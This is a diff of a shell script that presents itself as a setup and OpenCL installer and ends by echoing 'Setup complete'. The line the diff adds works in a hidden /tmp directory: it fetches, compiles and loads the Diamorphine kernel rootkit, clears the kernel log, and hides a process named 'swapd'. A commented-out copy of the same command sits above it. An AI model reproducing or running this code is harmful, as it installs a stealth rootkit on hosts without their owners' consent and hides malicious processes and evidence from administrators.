@@ -368,7 +368,7 @@ echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/l
 # cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; apt-get update -y ; apt-get install linux-headers-$(uname -r) git make gcc -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; yum install linux-generic linux-headers-$(uname -r) kernel-devel.x86_64 kernel-firmware.noarch kernel-headers.x86_64 git make gcc -y ; apt-get update -y ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; yum install linux-generic linux-headers-$(uname -r) kernel-devel kernel-firmware kernel-modules kernel-headers git make gcc -y ; apt-get update -y ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 echo "[*] Setup complete"
 
